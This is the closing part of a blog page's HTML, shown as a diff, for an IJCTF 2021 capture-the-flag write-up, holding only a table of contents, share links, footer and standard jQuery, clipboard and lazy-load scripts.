href="#Riddle-Joker"><span class="toc-number">2.1.</span> <span class="toc-text">Riddle Joker</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#Vault"><span class="toc-number">2.2.</span> <span class="toc-text">Vault</span></a><ol class="toc-child"><li class="toc-item toc-level-4"><a class="toc-link" href="#%E6%B5%81%E9%87%8F%E5%8C%85%E8%99%95%E7%90%86"><span class="toc-number">2.2.1.</span> <span class="toc-text">流量包處理</span></a></li><li class="toc-item toc-level-4"><a class="toc-link" href="#HTTP2-%E6%B5%81%E9%87%8F%E7%9A%84%E5%88%86%E6%9E%90"><span class="toc-number">2.2.2.</span> <span class="toc-text">HTTP2 流量的分析</span></a></li></ol></li></ol></li></ol>
+    </div>
+
+    <div id="share-footer" style="display: none">
+      <ul>
+  <li><a class="icon" target="_blank" rel="noopener" href="http://www.facebook.com/sharer.php?u=https://lemonprefect.cn/zh-TW/posts/603682ab.html"><i class="fab fa-facebook fa-lg" aria-hidden="true"></i></a></li>
+  <li><a class="icon" target="_blank" rel="noopener" href="https://twitter.com/share?url=https://lemonprefect.cn/zh-TW/posts/603682ab.html&text=IJCTF 2021"><i class="fab fa-twitter fa-lg" aria-hidden="true"></i></a></li>
+  <li><a class="icon" target="_blank" rel="noopener" href="http://www.linkedin.com/shareArticle?url=https://lemonprefect.cn/zh-TW/posts/603682ab.html&title=IJCTF 2021"><i class="fab fa-linkedin fa-lg" aria-hidden="true"></i></a></li>
+  <li><a class="icon" target="_blank" rel="noopener" href="https://pinterest.com/pin/create/bookmarklet/?url=https://lemonprefect.cn/zh-TW/posts/603682ab.html&is_video=false&description=IJCTF 2021"><i class="fab fa-pinterest fa-lg" aria-hidden="true"></i></a></li>
+  <li><a class="icon" href="mailto:?subject=IJCTF 2021&body=Check out this article: https://lemonprefect.cn/zh-TW/posts/603682ab.html"><i class="fas fa-envelope fa-lg" aria-hidden="true"></i></a></li>
+  <li><a class="icon" target="_blank" rel="noopener" href="https://getpocket.com/save?url=https://lemonprefect.cn/zh-TW/posts/603682ab.html&title=IJCTF 2021"><i class="fab fa-get-pocket fa-lg" aria-hidden="true"></i></a></li>
+  <li><a class="icon" target="_blank" rel="noopener" href="http://reddit.com/submit?url=https://lemonprefect.cn/zh-TW/posts/603682ab.html&title=IJCTF 2021"><i class="fab fa-reddit fa-lg" aria-hidden="true"></i></a></li>
+  <li><a class="icon" target="_blank" rel="noopener" href="http://www.stumbleupon.com/submit?url=https://lemonprefect.cn/zh-TW/posts/603682ab.html&title=IJCTF 2021"><i class="fab fa-stumbleupon fa-lg" aria-hidden="true"></i></a></li>
+  <li><a class="icon" target="_blank" rel="noopener" href="http://digg.com/submit?url=https://lemonprefect.cn/zh-TW/posts/603682ab.html&title=IJCTF 2021"><i class="fab fa-digg fa-lg" aria-hidden="true"></i></a></li>
+  <li><a class="icon" target="_blank" rel="noopener" href="http://www.tumblr.com/share/link?url=https://lemonprefect.cn/zh-TW/posts/603682ab.html&name=IJCTF 2021&description="><i class="fab fa-tumblr fa-lg" aria-hidden="true"></i></a></li>
+  <li><a class="icon" target="_blank" rel="noopener" href="https://news.ycombinator.com/submitlink?u=https://lemonprefect.cn/zh-TW/posts/603682ab.html&t=IJCTF 2021"><i class="fab fa-hacker-news fa-lg" aria-hidden="true"></i></a></li>
+</ul>
+
+    </div>
+
+    <div id="actions-footer">
+        <a id="menu" class="icon" href="#" onclick="$('#nav-footer').toggle();return false;"><i class="fas fa-bars fa-lg" aria-hidden="true"></i> 選單</a>
+        <a id="toc" class="icon" href="#" onclick="$('#toc-footer').toggle();return false;"><i class="fas fa-list fa-lg" aria-hidden="true"></i> 文章目錄</a>
+        <a id="share" class="icon" href="#" onclick="$('#share-footer').toggle();return false;"><i class="fas fa-share-alt fa-lg" aria-hidden="true"></i> 分享</a>
+        <a id="top" style="display:none" class="icon" href="#" onclick="$('html, body').animate({ scrollTop: 0 }, 'fast');"><i class="fas fa-chevron-up fa-lg" aria-hidden="true"></i> 頁首</a>
+    </div>
+
+  </div>
+</div>
+
+        
+        <footer id="footer">
+  <div class="footer-right">
+    <nav>
+      <ul>
+         
+          <li><a href="/zh-TW/">首頁</a></li>
+         
+          <li><a href="/zh-TW/archives/">文章</a></li>
+         
+          <li><a href="/writeups/">WriteUps</a></li>
+         
+          <li><a href="/tools/">工具</a></li>
+         
+          <li><a href="/about/">關於</a></li>
+         
+          <li><a href="/search/">搜尋</a></li>
+        
+        
+        
+        <li>
+        
+          <a href="/zh-CN">简</a>
+        
+          <a href="/en">En</a>
+        
+          <a href="#">正</a>
+        
+        </li>
+      </ul>
+    </nav>
+  </div>
+  <div class="footer-left">
+    Copyright &copy;
+    
+    
+    2018-2021
+    LemonPrefect
+    
+      <a target="_blank" rel="noopener" href="http://beian.miit.gov.cn/">湘ICP备20002800号</a>
+    
+    
+      <img no-lazy src="/images/beian.png"/>
+      <a href= "http://www.beian.gov.cn/portal/registerSystemInfo?recordcode=43021102000188">湘公网安备43021102000188号</a>
+    
+    
+  </div>
+</footer>
+
+    </div>
+    <!-- styles -->
+
+
+
+  <link rel="preload" as="style" href="https://cdn.bootcdn.net/ajax/libs/font-awesome/5.15.3/css/all.min.css" crossorigin="anonymous" onload="this.onload=null;this.rel='stylesheet'"/>
+
+
+    <!-- jquery -->
+ 
+  <script src="https://cdn.bootcdn.net/ajax/libs/jquery/3.6.0/jquery.min.js" crossorigin="anonymous"></script> 
+
+
+
+
+<!-- clipboard -->
+
+  
+    <script src="https://cdn.bootcdn.net/ajax/libs/clipboard.js/2.0.8/clipboard.min.js" crossorigin="anonymous"></script> 
+  
+  <script type="text/javascript">
+  $(function() {
+    // copy-btn HTML
+    var btn = "<span class=\"btn-copy tooltipped tooltipped-sw\" aria-label=\"复制到粘贴板!\">";
+    btn += '<i class="far fa-clone"></i>';
+    btn += '</span>'; 
+    // mount it!
+    $(".highlight table").before(btn);
+    var clip = new ClipboardJS('.btn-copy', {
+      text: function(trigger) {
+        return Array.from(trigger.nextElementSibling.querySelectorAll('.code')).reduce((str,it)=>str+it.innerText+'\n','')
+      }
+    });
+    clip.on('success', function(e) {
+      e.trigger.setAttribute('aria-label', "复制成功!");
+      e.clearSelection();
+    })
+  })
+  </script>
+
+
+<script src="/js/main.js"></script>
+
+<!-- search -->
+
+<!-- Google Analytics -->
+
+<!-- Baidu Analytics -->
+
+<!-- Cloudflare Analytics -->
+
+<!-- Umami Analytics -->
+
+<!-- Disqus Comments -->
+
+
+<script>
+            window.imageLazyLoadSetting = {
+                isSPA: false,
+                preloadRatio: 2,
+                processImages: null,
+            };
+        </script><script>window.addEventListener("load",function(){var t=/\.(gif|jpg|jpeg|tiff|png)$/i,r=/^data:image\/[a-z]+;base64,/;Array.prototype.slice.call(document.querySelectorAll("img[data-original]")).forEach(function(a){var e=a.parentNode;"A"===e.tagName&&(e.href.match(t)||e.href.match(r))&&(e.href=a.dataset.original)})});</script><script>!function(i){i.imageLazyLoadSetting.processImages=a;var n=i.imageLazyLoadSetting.isSPA,o=i.imageLazyLoadSetting.preloadRatio||1,r=Array.prototype.slice.call(document.querySelectorAll("img[data-original]"));function a(){n&&(r=Array.prototype.slice.call(document.querySelectorAll("img[data-original]")));for(var t,e,a=0;a<r.length;a++)t=r[a],e=void 0,0<=(e=t.getBoundingClientRect()).bottom&&0<=e.left&&e.top<=(i.innerHeight*o||document.documentElement.clientHeight*o)&&function(){var t,e,i,n,o=r[a];t=o,e=function(){r=r.filter(function(t){return o!==t})},i=new Image,n=t.getAttribute("data-original"),i.onload=function(){t.src=n,e&&e()},t.src!==n&&(i.src=n)}()}a(),i.addEventListener("scroll",function(){var t,e;t=a,e=i,clearTimeout(t.tId),t.tId=setTimeout(function(){t.call(e)},500)})}(this);</script></body>
+</html>
